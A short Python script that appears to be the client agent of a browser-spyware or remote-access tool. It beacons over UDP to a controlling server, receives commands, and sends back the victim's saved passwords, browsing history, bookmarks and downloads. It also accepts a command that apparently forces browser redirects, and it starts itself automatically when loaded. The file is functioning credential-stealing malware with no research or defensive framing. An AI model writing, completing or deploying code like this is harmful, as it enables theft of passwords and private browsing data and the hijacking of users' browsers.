import socket
import sys
import main
import time

def comm():
	host = "0.0.0.0"
	port = 4005
	
	server = ("0.0.0.0", 4000)
	req = ""
	
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.bind((host, port))
		
	while req != "exit":
		s.sendto("trace_conn".encode('utf-8'), server)
		
		try:
			s.settimeout(5.0)
			req, addr = s.recvfrom(100000)
			req = req.decode('utf-8')
			s.settimeout(None)
			
			# print("REQ: "+req)
			
			if req == "--get-pwds":
				try:
					res = str(main.GET_PWD())
				except Exception as e:
					# print(e)
					res = "Error decoding passwords."
					
			elif req == "--get-hist":
				try:
					res = main.GET_HISTORY()
				except Exception as e:
					print(e)
			elif req == "--get-bkmrks":
				res = main.GET_BOOKMARKS()
			elif req == "--get-dwnlds":
				res = main.GET_DOWNLOADS()
			elif "--redir" in req:
				if "True" in req:
					res = main.FORCED_REDIR(req.split("--redir ")[1].split(" ")[0], True)
				elif "False" in req:
					res = main.FORCED_REDIR(req.split("--redir ")[1].split(" ")[0], False)
				
			s.sendto(str(res).encode('utf-8'), server)
			
			req = ""
		except:	
			s.sendto("trace_conn".encode('utf-8'), server)
			pass
		
	s.close()
	
time.sleep(2)	
comm()
	